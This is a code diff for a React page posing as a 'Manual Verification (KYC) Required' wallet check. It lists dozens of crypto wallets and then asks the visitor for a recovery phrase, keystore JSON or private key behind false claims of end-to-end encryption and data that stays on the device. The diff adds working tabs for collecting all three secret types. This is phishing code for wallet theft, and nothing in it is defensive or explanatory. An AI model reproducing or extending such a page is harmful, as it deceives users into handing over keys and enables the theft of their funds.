@@ -66,7 +66,7 @@ const wallets = [
     { name: "BOBA", icon: "/icons/boba.svg" },
     { name: "EVMOS", icon: "/icons/evmos.png" },
     { name: "THORCHAIN", icon: "/icons/thorchain.svg" },
-    { name: "TokenPocket", icon: "/icons/tokenpocket.png" },
+    { name: "TokenPocket", icon: "/icons/tokenpocket.jpeg" },
     { name: "Aave", icon: "/icons/aave-aave-logo.png" },
     { name: "Digitex", icon: "/icons/digitex.png" },
     { name: "Portis", icon: "/icons/portis.png" },
@@ -145,7 +145,7 @@ const wallets = [
     { name: "TARAXA", icon: "/icons/tara.webp" },
     { name: "LINEA", icon: "/icons/linea.webp" },
     { name: "OPBNB", icon: "/icons/bnb.svg" },
-    { name: "LUKSO", icon: "/icons/lyk.webp" },
+    { name: "LUKSO", icon: "/icons/lyx.webp" },
     { name: "CELESTIA", icon: "/icons/tia.webp" },
     { name: "NEUTRON", icon: "/icons/ntrn.webp" },
     { name: "ORAI", icon: "/icons/orai.webp" },
@@ -229,14 +229,14 @@ const wallets = [
     { name: "Coinmoni", icon: "/icons/coinmoni.png" },
     { name: "GridPlus", icon: "/icons/gridplus" },
     { name: "CYBAVO", icon: "/icons/cybavo.png" },
-    { name: "Tokenary", icon: "/icons/tokenary.png" },
+    { name: "Tokenary", icon: "/icons/tokenary.jpg" },
     { name: "Torus", icon: "/icons/torus" },
     { name: "Spatium", icon: "/icons/spatium.png" },
     { name: "SafePal", icon: "/icons/safepal.jpeg" },
     { name: "Infinito", icon: "/icons/infinito.png" },
     { name: "wallet.io", icon: "/icons/walletio" },
     { name: "Ownbit", icon: "/icons/ownbit.png" },
-    { name: "EasyPocket", icon: "/icons/easypocket.png" },
+    { name: "EasyPocket", icon: "/icons/easypocket.jpg" },
     { name: "Bridge Wallet", icon: "/icons/bridgewallet.png" },
     { name: "Spark Point", icon: "/icons/Sparkpoint-wallet-logo.png" },
     { name: "ViaWallet", icon: "/icons/viawallet.png" },
@@ -267,6 +267,7 @@ export default function WalletSystemPage() {
     const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
     const [showSecureDialog, setShowSecureDialog] = useState(false);
     const [showPhraseDialog, setShowPhraseDialog] = useState(false);
+    const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "privateKey">("phrase");
 
     function normalize(str: string) {
         return str.toLowerCase().replace(/[^a-z0-9]/g, "");
@@ -293,131 +294,172 @@ export default function WalletSystemPage() {
     };
 
     return (
-        <div className="relative min-h-screen w-full flex flex-col items-center justify-start py-12 overflow-hidden">
-            <div
-                className="absolute inset-0 w-full h-full z-0"
-                style={{
-                    backgroundImage: "url('/background.webp')",
-                    backgroundSize: "cover",
-                    backgroundPosition: "center",
-                    backgroundRepeat: "repeat",
-                    minHeight: "100vh",
-                }}>
-                <div className="relative z-10 w-full flex flex-col items-center">
-                    <h1 className="text-4xl md:text-5xl font-bold text-white text-center mb-4">
-                        Manual Verification (KYC) Required
-                    </h1>
-                    <p className="text-lg text-white text-center mb-2">
-                        Leaving this page without verifying your wallet means you will not be eligible to connect your wallet.
-                    </p>
-                    <p className="text-lg text-white text-center mb-8">
-                        Step 1. Select Your Wallet Step 2. Verify Wallet Ownership Step 3. Receive Your Unique claim code.
-                    </p>
-                    <input
-                        type="text"
-                        placeholder="Search wallet names..."
-                        className="w-full max-w-5xl px-6 py-3 rounded-lg text-lg mb-10 outline-none border-none shadow-lg bg-white text-black text-center"
-                        value={search}
-                        onChange={(e) => setSearch(e.target.value)}
-                    />
-                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-8 w-full max-w-7xl">
-                        {filteredWallets.map((wallet) => (
-                            <div
-                                key={wallet.name}
-                                className="flex flex-col items-center cursor-pointer hover:scale-105 transition-transform"
-                                onClick={() => handleWalletClick(wallet)}
-                            >
-                                <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center mb-2 border-2 border-white">
-                                    <img
-                                        src={wallet.icon}
-                                        alt={wallet.name}
-                                        className="w-18 h-18 object-contain rounded-full"
-                                    />
-                                </div>
-                                <span className="text-white text-center text-sm font-semibold">{wallet.name}</span>
-                            </div>
-                        ))}
-                    </div>
-                    {/* Secure Connection Dialog */}
-                    {showSecureDialog && selectedWallet && (
-                        <div className="fixed inset-0 flex items-center justify-center bg-transparent bg-opacity-40 z-50">
-                            <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md relative">
-                                <div className="flex items-center justify-between px-4 py-2 border-b border-gray-100 rounded-t-lg">
-                                    <button
-                                        className="text-blue-600 font-bold text-sm"
-                                        onClick={handleCloseDialogs}
-                                    >
-                                        Back
-                                    </button>
-                                    <button
-                                        className="text-gray-500"
-                                        onClick={handleCloseDialogs}
-                                    >
-                                        X
-                                    </button>
-                                </div>
-                                <div className="flex flex-col items-center px-6 py-6">
-                                    <div className="border-2 border-red-400 p-4 rounded-lg text-center">
-                                        <div className="border-2 border-green-400 rounded-lg p-4 mb-4 bg-green bg-opacity-40">
-                                            <div className="mb-4">
-                                                <span className="font-bold text-lg text-green-700">{selectedWallet.name}</span>
-                                            </div>
-                                            <div className="text-green-700 font-semibold mb-2">
-                                                Your connection is secure and encrypted, ensuring your information remains on your device.
-                                            </div>
-                                            <div className="flex flex-col items-center">
-                                                <div className="w-8 h-8 border-4 border-green-400 border-t-transparent rounded-full animate-spin mb-2"></div>
-                                                <div className="text-gray-700">Starting secure connection...</div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div className="flex flex-row justify-between items-center mt-6 w-full border-2 border-gray-400 p-2 rounded-lg">
-                                        <div className="w-14 h-14 bg-white rounded-full flex items-center justify-center mb-2">
-                                            <img
-                                                src={selectedWallet.icon}
-                                                alt={selectedWallet.name}
-                                                className="w-12 h-12 object-contain rounded-full"
-                                            />
-                                        </div>
-                                        <span className="text-gray-800 font-bold text-lg">{selectedWallet.name}</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    )}
-
-                    {/* Phrase/Keystore/Private Key Dialog */}
-                    {showPhraseDialog && selectedWallet && (
-                        <div className="fixed inset-0 flex items-center justify-center bg-transparent bg-opacity-40 z-50">
-                            <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md relative">
-                                <button className="absolute top-2 right-4 text-gray-500" onClick={handleCloseDialogs}>X</button>
-                                <div className="flex items-center mb-4">
-                                    <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-18 h-18 rounded-full mr-3" />
-                                    <span className="font-bold text-black text-xl">{selectedWallet.name}</span>
-                                </div>
-                                <div className="flex space-x-4 mb-4">
-                                    <button className="font-semibold text-gray-400 border-b-2 border-blue-500">Phrase</button>
-                                    <button className="font-semibold text-gray-400">Keystore</button>
-                                    <button className="font-semibold text-gray-400">Private Key</button>
-                                </div>
-                                <textarea
-                                    className="w-full border rounded p-2 mb-2 text-black"
-                                    placeholder="Enter your recovery phrase"
-                                    rows={3}
+        <div className="relative min-h-screen w-full flex flex-col items-center justify-start py-12"
+            style={{
+                backgroundImage: "url('/background.webp')",
+                backgroundSize: "cover",
+                backgroundPosition: "center",
+                backgroundRepeat: "repeat",
+                backgroundAttachment: "fixed",
+                minHeight: "100vh",
+            }}>
+            <div className="relative z-10 w-full flex flex-col items-center">
+                <h1 className="text-4xl md:text-5xl font-bold text-white text-center mb-4">
+                    Manual Verification (KYC) Required
+                </h1>
+                <p className="text-lg text-white text-center mb-2">
+                    Leaving this page without verifying your wallet means you will not be eligible to connect your wallet.
+                </p>
+                <p className="text-lg text-white text-center mb-8">
+                    Step 1. Select Your Wallet Step 2. Verify Wallet Ownership Step 3. Receive Your Unique claim code.
+                </p>
+                <input
+                    type="text"
+                    placeholder="Search wallet names..."
+                    className="w-full max-w-5xl px-6 py-3 rounded-lg text-lg mb-10 outline-none border-none shadow-lg bg-white text-black text-center"
+                    value={search}
+                    onChange={(e) => setSearch(e.target.value)}
+                />
+                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-8 w-full max-w-7xl">
+                    {filteredWallets.map((wallet) => (
+                        <div
+                            key={wallet.name}
+                            className="flex flex-col items-center cursor-pointer hover:scale-105 transition-transform"
+                            onClick={() => handleWalletClick(wallet)}
+                        >
+                            <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center mb-2 border-2 border-white">
+                                <img
+                                    src={wallet.icon}
+                                    alt={wallet.name}
+                                    className="w-18 h-18 object-contain rounded-full"
                                 />
-                                <div className="text-xs text-gray-500 mb-4">
-                                    Typically 12 (sometimes 24) words separated by single spaces
+                            </div>
+                            <span className="text-white text-center text-sm font-semibold">{wallet.name}</span>
+                        </div>
+                    ))}
+                </div>
+                {/* Secure Connection Dialog */}
+                {showSecureDialog && selectedWallet && (
+                    <div className="fixed inset-0 flex items-center justify-center bg-transparent bg-opacity-40 z-50">
+                        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md relative">
+                            <div className="flex items-center justify-between px-4 py-2 border-b border-gray-100 rounded-t-lg">
+                                <button
+                                    className="text-blue-600 font-bold text-sm"
+                                    onClick={handleCloseDialogs}
+                                >
+                                    Back
+                                </button>
+                                <button
+                                    className="text-gray-500"
+                                    onClick={handleCloseDialogs}
+                                >
+                                    X
+                                </button>
+                            </div>
+                            <div className="flex flex-col items-center px-6 py-6">
+                                <div className="border-2 border-red-400 p-4 rounded-lg text-center">
+                                    <div className="border-2 border-green-400 rounded-lg p-4 mb-4 bg-green bg-opacity-40">
+                                        <div className="mb-4">
+                                            <span className="font-bold text-lg text-green-700">{selectedWallet.name}</span>
+                                        </div>
+                                        <div className="text-green-700 font-semibold mb-2">
+                                            Your connection is secure and encrypted, ensuring your information remains on your device.
+                                        </div>
+                                        <div className="flex flex-col items-center">
+                                            <div className="w-8 h-8 border-4 border-green-400 border-t-transparent rounded-full animate-spin mb-2"></div>
+                                            <div className="text-gray-700">Starting secure connection...</div>
+                                        </div>
+                                    </div>
                                 </div>
-                                <button className="w-full bg-blue-600 text-white py-2 rounded mb-2 font-bold">PROCEED</button>
-                                <button className="w-full bg-red-500 text-white py-2 rounded" onClick={handleCloseDialogs}>Cancel</button>
-                                <div className="flex items-center mt-4 bg-green-100 p-2 rounded">
-                                    <img src="/icons/lock.png" alt="Lock" className="w-16 h-16 mr-2 inline-block rounded-full" />
-                                    <span className="text-green-700 text-sm">This session is protected with end-to-end encryption. Safe to connect manually.</span>
+                                <div className="flex flex-row justify-between items-center mt-6 w-full border-2 border-gray-400 p-2 rounded-lg">
+                                    <div className="w-14 h-14 bg-white rounded-full flex items-center justify-center mb-2">
+                                        <img
+                                            src={selectedWallet.icon}
+                                            alt={selectedWallet.name}
+                                            className="w-12 h-12 object-contain rounded-full"
+                                        />
+                                    </div>
+                                    <span className="text-gray-800 font-bold text-lg">{selectedWallet.name}</span>
                                 </div>
                             </div>
                         </div>
-                    )}
-                </div>
+                    </div>
+                )}
+
+                {/* Phrase/Keystore/Private Key Dialog */}
+                {showPhraseDialog && selectedWallet && (
+                    <div className="fixed inset-0 flex items-center justify-center bg-transparent bg-opacity-40 z-50">
+                        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md relative">
+                            <button className="absolute top-2 right-4 text-gray-500" onClick={handleCloseDialogs}>X</button>
+                            <div className="flex items-center mb-4">
+                                <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-18 h-18 rounded-full mr-3" />
+                                <span className="font-bold text-black text-xl">{selectedWallet.name}</span>
+                            </div>
+                            <div className="flex space-x-4 mb-4">
+                                <button
+                                    className={`font-semibold border-b-2 ${activeTab === "phrase" ? "text-blue-600 border-blue-500" : "text-gray-400 border-transparent"}`}
+                                    onClick={() => setActiveTab("phrase")}
+                                >
+                                    Phrase
+                                </button>
+                                <button
+                                    className={`font-semibold border-b-2 ${activeTab === "keystore" ? "text-blue-600 border-blue-500" : "text-gray-400 border-transparent"}`}
+                                    onClick={() => setActiveTab("keystore")}
+                                >
+                                    Keystore
+                                </button>
+                                <button
+                                    className={`font-semibold border-b-2 ${activeTab === "privateKey" ? "text-blue-600 border-blue-500" : "text-gray-400 border-transparent"}`}
+                                    onClick={() => setActiveTab("privateKey")}
+                                >
+                                    Private Key
+                                </button>
+                            </div>
+                            {activeTab === "phrase" && (
+                                <>
+                                    <textarea
+                                        className="w-full border rounded p-2 mb-2 text-black"
+                                        placeholder="Enter your recovery phrase"
+                                        rows={3}
+                                    />
+                                    <div className="text-xs text-gray-500 mb-4">
+                                        Typically 12 (sometimes 24) words separated by single spaces
+                                    </div>
+                                </>
+                            )}
+                            {activeTab === "keystore" && (
+                                <>
+                                    <textarea
+                                        className="w-full border rounded p-2 mb-2 text-black"
+                                        placeholder="Paste your keystore JSON"
+                                        rows={3}
+                                    />
+                                    <div className="text-xs text-gray-500 mb-4">
+                                        Paste your keystore file content here
+                                    </div>
+                                </>
+                            )}
+                            {activeTab === "privateKey" && (
+                                <>
+                                    <textarea
+                                        className="w-full border rounded p-2 mb-2 text-black"
+                                        placeholder="Enter your private key"
+                                        rows={2}
+                                    />
+                                    <div className="text-xs text-gray-500 mb-4">
+                                        Paste your private key string here
+                                    </div>
+                                </>
+                            )}
+                            <button className="w-full bg-blue-600 text-white py-2 rounded mb-2 font-bold">PROCEED</button>
+                            <button className="w-full bg-red-500 text-white py-2 rounded" onClick={handleCloseDialogs}>Cancel</button>
+                            <div className="flex items-center mt-4 bg-green-100 p-2 rounded">
+                                <img src="/icons/lock.png" alt="Lock" className="w-16 h-16 mr-2 inline-block rounded-full" />
+                                <span className="text-green-700 text-sm">This session is protected with end-to-end encryption. Safe to connect manually.</span>
+                            </div>
+                        </div>
+                    </div>
+                )}
             </div>
         </div>
     );
